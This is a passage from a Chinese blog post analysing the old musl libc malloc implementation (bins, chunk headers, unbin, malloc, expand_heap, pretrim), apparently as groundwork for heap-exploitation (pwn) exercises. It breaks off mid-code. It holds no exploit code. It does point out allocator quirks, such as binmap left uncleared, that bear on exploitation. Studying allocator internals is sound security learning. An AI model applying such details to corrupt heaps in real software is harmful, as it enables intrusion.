<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>存放空闲 <code>chunk</code> 的双向链表，存放 <code>chunk</code> 从 <code>tail</code> 端放，取 <code>chunk</code> 从 <code>head</code> 端取。<br><code>bin</code> 中的 <code>head</code> 和 <code>tail</code> 初始为 0 ，但是在使用 <code>bin</code> 时一般会先调用 <code>lock_bin</code> ，此时如果 <code>bin</code> 为空会将 <code>head</code> 和 <code>tail</code> 设为 <code>&amp;bin[i] - 0x10</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">lock_bin</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    lock(mal.bins[i].lock);</span><br><span class="line">    <span class="keyword">if</span> (!mal.bins[i].head)</span><br><span class="line">        mal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> psize, csize;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>chunk</code> 头部结构跟 glibc 差不多，不过没有 <code>nextsize</code> 指针，<code>chunk</code> 之间不重用 <code>psize</code> 字段。<br><code>psize</code> 和 <code>csize</code> 字段都有标志位（glibc 只有 <code>size</code> 字段有），但只有一种位于最低位的标志位 <code>C_INUSE</code>（glibc 最低三位都有标志位）。若 <code>csize</code> 设置 <code>C_INUSE</code> 标志位（最低位为 1 ），表示 <code>chunk</code> 正在被使用；若没有设置 <code>C_INUSE</code> 标志位（最低位为 0 ），表示 <code>chunk</code> 已经被释放或者通过 mmap 分配的，需要通过 <code>psize</code> 的标志位来进一步判断 <code>chunk</code> 的状态。若 <code>psize</code> 设置 <code>C_INUSE</code> 标志位表示前一个 <code>chunk</code> 正在被使用。另外，<code>chunk</code> 的大小关于 0x20 对齐。</p>
<h4 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h4><p><code>chunk</code> 的相关宏定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_ALIGN (4*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_MASK (-SIZE_ALIGN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERHEAD (2*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_THRESHOLD (0x1c00*SIZE_ALIGN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DONTCARE 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RECLAIM 163840</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_SIZE(c) ((c)-&gt;csize &amp; -2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_PSIZE(c) ((c)-&gt;psize &amp; -2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_CHUNK(c) ((struct chunk *)((char *)(c) - CHUNK_PSIZE(c)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_CHUNK(c) ((struct chunk *)((char *)(c) + CHUNK_SIZE(c)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_TO_CHUNK(p) (struct chunk *)((char *)(p) - OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_TO_MEM(c) (void *)((char *)(c) + OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIN_TO_CHUNK(i) (MEM_TO_CHUNK(&amp;mal.bins[i].head))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_INUSE  ((size_t)1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br></pre></td></tr></table></figure></div>

<h4 id="unbin"><a href="#unbin" class="headerlink" title="unbin"></a>unbin</h4><p>将 <code>chunk</code> 从 <code>bins</code> 中取出，并更新 <code>binmap</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span> &lt;&lt; i));</span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>当满足 <code>c-&gt;prev != c-&gt;next</code> 时可以不将 <code>mal.binmap</code> 清空。</strong></p>
<h4 id="alloc-fwd-alloc-rev"><a href="#alloc-fwd-alloc-rev" class="headerlink" title="alloc_fwd &amp; alloc_rev"></a>alloc_fwd &amp; alloc_rev</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_fwd</span><span class="params">(<span class="keyword">struct</span> chunk *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">size_t</span> k;</span><br><span class="line">    <span class="keyword">while</span> (!((k = c-&gt;csize) &amp; C_INUSE)) &#123;</span><br><span class="line">        i = bin_index(k);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;csize == k) &#123;</span><br><span class="line">            unbin(c, i);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_rev</span><span class="params">(<span class="keyword">struct</span> chunk *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">size_t</span> k;</span><br><span class="line">    <span class="keyword">while</span> (!((k = c-&gt;psize) &amp; C_INUSE)) &#123;</span><br><span class="line">        i = bin_index(k);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;psize == k) &#123;</span><br><span class="line">            unbin(PREV_CHUNK(c), i);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>alloc_fwd</code> 通过当前 <code>chunk</code> 的 <code>csize</code> 检查当前 <code>chunk</code> 是否空闲，如果空闲调用 <code>unbin</code> 函数将当前 <code>chunk</code> 从 <code>bins</code> 链表中取出。<br><code>alloc_rev</code> 通过当前 <code>chunk</code> 的 <code>psize</code> 检查当前 <code>chunk</code> 的前一个 <code>chunk</code> 是否空闲，如果空闲调用 <code>unbin</code> 函数将当前 <code>chunk</code> 的前一个 <code>chunk</code> 从 <code>bins</code> 链表中取出。</p>
<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>首先调用 <code>adjust_size</code> 检查申请内存大小是否合理并将申请的内存大小转换为 <code>chunk</code> 大小，具体转换规则为加 0x10 然后关于 0x20 向上对齐。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">adjust_size</span><span class="params">(<span class="type">size_t</span> *n)</span> &#123;</span><br><span class="line">    <span class="comment">/* Result of pointer difference must fit in ptrdiff_t. */</span></span><br><span class="line">    <span class="keyword">if</span> (*n - <span class="number">1</span> &gt; PTRDIFF_MAX - SIZE_ALIGN - PAGE_SIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*n) &#123;</span><br><span class="line">            errno = ENOMEM;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            *n = SIZE_ALIGN;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *n = (*n + OVERHEAD + SIZE_ALIGN - <span class="number">1</span>) &amp; SIZE_MASK;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>chunk</code> 大小超过 <code>MMAP_THRESHOLD</code>（即 0x38000 ）则直接 mmap 分配 <code>chunk</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">    <span class="type">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">    <span class="type">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ | PROT_WRITE,</span><br><span class="line">                        MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (base == (<span class="type">void</span> *) <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    c = (<span class="type">void</span> *) (base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">    c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">    c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">    <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>mmap 得到的 <code>chunk</code> 结构如下，注意该 <code>chunk</code> 的 <code>psize</code> 和 <code>csize</code> 的 <code>C_INUSE</code> 标志位均没有置位且没有下一个 <code>chunk</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20251210113242943.png"
                      alt="image-20251210113242943"
                ></p>
<p>如果大小不超过 <code>MMAP_THRESHOLD</code> 则先通过 <code>bin_index_up</code> 函数计算 <code>chunk</code> 大小对应的 <code>bin</code> 数组下标 <code>i</code> 。然后通过 <code>mal.binmap</code> 获取下标大于等于 <code>i</code> 的非空 <code>bin</code> 。接下来是两种情况，如果没有则调用 <code>expand_heap</code> 函数扩展堆然后调用 <code>alloc_rev</code> 将新扩展的堆块和前面空闲的堆块合并然后跳出循环，否则调用 <code>first_set</code> 函数获取大于等于 <code>i</code> 的最小下标，然后利用 <code>pretrim</code> 或 <code>unbin</code> 将 <code>chunk</code> 从 <code>bin</code> 链表中取出，最终也会跳出循环。这两种情况最终都会调用 <code>trim</code> 函数，这个函数的作用是从 <code>c</code> 上切下一块 <code>chunk</code> 用于内存分配，剩下的释放掉。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="type">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="type">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (base == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		c = (<span class="type">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">		<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	i = bin_index_up(n);</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="type">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">		<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">			c = expand_heap(n);</span><br><span class="line">			<span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">				c = PREV_CHUNK(c);</span><br><span class="line">				NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">					x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		j = first_set(mask);</span><br><span class="line">		lock_bin(j);</span><br><span class="line">		c = mal.bins[j].head;</span><br><span class="line">		<span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">			unlock_bin(j);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		unlock_bin(j);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">	trim(c, n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="expand-heap"><a href="#expand-heap" class="headerlink" title="expand_heap"></a>expand_heap</h3><p>首先将需要扩展的大小 <code>n</code> 加上 <code>SIZE_ALIGN</code>（0x20），之后调用 <code>__expand_heap</code> 扩展堆并返回扩展后的内存的起始地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The argument n already accounts for the caller&#x27;s chunk</span></span><br><span class="line"><span class="comment"> * overhead needs, but if the heap can&#x27;t be extended in-place,</span></span><br><span class="line"><span class="comment"> * we need room for an extra zero-sized sentinel chunk. */</span></span><br><span class="line">n += SIZE_ALIGN;</span><br><span class="line"></span><br><span class="line">lock(heap_lock);</span><br><span class="line"></span><br><span class="line">p = __expand_heap(&amp;n);</span><br><span class="line"><span class="keyword">if</span> (!p) &#123;</span><br><span class="line">    unlock(heap_lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果新扩展的内存的起始地址不等于上一段扩展的内存的结束地址说明内存扩展不连续或者是第一次获取内存，需要在新扩展的 <code>chunk</code> 前面设置一个 <code>sentinel chunk</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If not just expanding existing space, we need to make a</span></span><br><span class="line"><span class="comment"> * new sentinel chunk below the allocated space. */</span></span><br><span class="line"><span class="keyword">if</span> (p != end) &#123;</span><br><span class="line">    <span class="comment">/* Valid/safe because of the prologue increment. */</span></span><br><span class="line">    n -= SIZE_ALIGN;</span><br><span class="line">    p = (<span class="type">char</span> *) p + SIZE_ALIGN;</span><br><span class="line">    w = MEM_TO_CHUNK(p);</span><br><span class="line">    w-&gt;psize = <span class="number">0</span> | C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后设置新扩展的 <code>chunk</code> 和下一个 <code>chunk</code> 的头部信息。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Record new heap end and fill in footer. */</span></span><br><span class="line">end = (<span class="type">char</span> *) p + n;</span><br><span class="line">w = MEM_TO_CHUNK(end);</span><br><span class="line">w-&gt;psize = n | C_INUSE;</span><br><span class="line">w-&gt;csize = <span class="number">0</span> | C_INUSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill in header, which may be new or may be replacing a</span></span><br><span class="line"><span class="comment"> * zero-size sentinel header at the old end-of-heap. */</span></span><br><span class="line">w = MEM_TO_CHUNK(p);</span><br><span class="line">w-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">unlock(heap_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> w;</span><br></pre></td></tr></table></figure></div>

<p>这里假设连续调用两次 <code>expand_heap</code>，则内存分布如下。由此可知道前面 <code>n += SIZE_ALIGN;</code> 是为了确保如果是不连续或第一次扩展堆时有可以有空间提供 <code>sentinel chunk</code> 和下一个 <code>chunk</code> 的头部。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/566d09f0c1b0a63232b6fa94494a346c.png"
                      alt="img"
                ></p>
<h3 id="expand-heap-1"><a href="#expand-heap-1" class="headerlink" title="__expand_heap"></a>__expand_heap</h3><p>首先检验扩展的大小 <code>n</code> 是否合理，之后将 <code>n</code> 关于页大小向上对齐。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt; SIZE_MAX / <span class="number">2</span> - PAGE_SIZE) &#123;</span><br><span class="line">    errno = ENOMEM;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">n += -n &amp; PAGE_SIZE - <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果 heap 段还没有初始化过则通过 <code>brk(0)</code> 系统调用获取 heap 段基址，并将 <code>brk</code> 关于页面大小向上对齐。 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!brk) &#123;</span><br><span class="line">    brk = __syscall(SYS_brk, <span class="number">0</span>);</span><br><span class="line">    brk += -brk &amp; PAGE_SIZE - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果满足 <code>brk</code> 调用条件且 <code>brk</code> 调用正常则直接返回得到的内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &lt; SIZE_MAX - brk &amp;&amp; !traverses_stack_p(brk, brk + n)</span><br><span class="line">    &amp;&amp; __syscall(SYS_brk, brk + n) == brk + n) &#123;</span><br><span class="line">    *pn = n;</span><br><span class="line">    brk += n;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *) (brk - n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>否则调用 mmap 扩展内存，扩展内存的大小为 <code>max(n, PAGE_SIZE &lt;&lt; mmap_step / 2)</code> 同时将 <code>mmap_step</code> 加 1 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> min = (<span class="type">size_t</span>) PAGE_SIZE &lt;&lt; mmap_step / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (n &lt; min) n = min;</span><br><span class="line"><span class="type">void</span> *area = __mmap(<span class="number">0</span>, n, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (area == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">*pn = n;</span><br><span class="line">mmap_step++;</span><br><span class="line"><span class="keyword">return</span> area;</span><br></pre></td></tr></table></figure></div>

<h3 id="pretrim"><a href="#pretrim" class="headerlink" title="pretrim"></a>pretrim</h3><p><code>pretrim</code> 函数的作用是如果申请的 <code>chunk</code> 中切下所需的部分剩余部分可以放到该 <code>chunk</code> 所在 <code>bins</code> 中则直接从该 <code>chunk</code> 中切下所需部分返回。如果满足上述条件，这样做可以减少一次 <code>unbin</code> 和 <code>pretrim</code> 从而提高程序效率。</p>
<p>首先这里特判了一些不需要 <code>pretrim</code> 的情况。总的来说就是 <code>chunk</code> 或切完剩下的 <code>chunk</code> 太小的时候不需要 <code>pretrim</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (j &lt; i + <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="keyword">if</span> (n1 - n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    n1 = CHUNK_SIZE(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后判断如果满足 <code>pretrim</code> 的条件就将 <code>self</code> 分裂为 <code>self</code> 和 <code>split</code>，<code>spit</code> 放到 <code>bins</code> 中原来 <code>self</code> 所在位置，然后把新的 <code>self</code> 返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bin_index(n1 - n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">next = NEXT_CHUNK(self);</span><br><span class="line">split = (<span class="type">void</span> *) ((<span class="type">char</span> *) self + n);</span><br><span class="line"></span><br><span class="line">split-&gt;prev = self-&gt;prev;</span><br><span class="line">split-&gt;next = self-&gt;next;</span><br><span class="line">split-&gt;prev-&gt;next = 